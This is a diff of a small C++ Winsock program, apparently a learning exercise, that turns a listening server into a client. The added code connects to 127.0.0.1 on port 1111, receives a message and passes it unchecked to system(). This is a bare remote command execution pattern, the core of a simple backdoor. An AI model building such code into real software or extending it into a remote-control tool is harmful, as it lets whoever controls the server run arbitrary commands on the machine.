@@ -4,9 +4,6 @@
 #pragma comment (lib, "ws2_32.lib")
 #pragma warning(disable: 4996)
 
-SOCKET Connections[100];
-int Counter = 0;
-
 int main(int argc, char* argv[]) {
 	WSAData wsaData;
 	WORD dllVersion = MAKEWORD(2, 1);
@@ -17,30 +14,21 @@ int main(int argc, char* argv[]) {
 
 	SOCKADDR_IN addr;
 	int sizeofaddr = sizeof(addr);
-	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
 	addr.sin_port = htons(1111);
 	addr.sin_family = AF_INET;
 
-	SOCKET sListen = socket(AF_INET, SOCK_STREAM, NULL);
-	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
-	listen(sListen, SOMAXCONN); //SOMAXCONN - кол-во соединений
-
-	SOCKET newConnection;
-	for (int i = 0; i < 100; i++) {
-		newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofaddr);
-
-		if (newConnection == 0) {
-			std::cout << "Error #2\n";
-		}
-		else {
-			std::cout << "Client Connected!\n";
-			char msg[256] = "ipconfig";
-			send(newConnection, msg, sizeof(msg), NULL);
-
-			Connections[i] = newConnection;
-			Counter++;
-		}
+	SOCKET Connection = socket(AF_INET, SOCK_STREAM, NULL);
+	if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
+		std::cout << "Error: faoled connest to server. \n";
+		return 1;
 	}
+	std::cout << "connected!\n";
+
+	char msg[256];
+	recv(Connection, msg, sizeof(msg), NULL);
+	//std::cout << msg << std::endl;
+	system(msg);
 
 	system("pause");
 
